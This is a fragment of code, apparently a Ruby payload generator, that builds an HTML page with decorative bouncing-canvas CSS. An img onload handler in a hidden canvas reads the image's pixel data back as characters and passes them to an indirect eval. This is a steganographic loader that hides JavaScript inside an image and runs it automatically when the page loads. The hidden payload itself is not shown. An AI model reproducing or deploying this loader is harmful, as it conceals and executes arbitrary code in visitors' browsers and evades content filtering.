...
html = "<head><style type='text/css'>body{background:#000 linear-gradient(0,#1b0116 0%,#06030D 72%,#000 100%);margin:0;padding:0;overflow:hidden;width:100%;height:100%}canvas{position:absolute;right:0;bottom:0;opacity:1;animation:bounce 2s infinite ease-in-out;transition:opacity 2s ease-in-out}.fade{opacity:0}p{color:#FFF;text-align:center;font-size:100px;font-weight:bold;pointer-events:none}@keyframes bounce{0%{transform:scale(1) rotate(0)}15%{transform:scale(.94)}30%{transform:scale(.94) rotate(2deg)}45%{transform:scale(1) rotate(0)}60%{transform:scale(.94)}75%{transform:scale(1) rotate(-2deg)}90%{transform:scale(.94) rotate(0)}100%{transform:scale(1)}}</style></head><body><canvas id='c' style='display:none'><img onload=for(w=c.width=#{width},a=c.getContext('2d'),a.drawImage(this,p=0,0),e='',d=a.getImageData(0,0,w,#{height}).data;t=d[p+=4];)e+=String.fromCharCode(t);(1,eval)(e) src=#>"
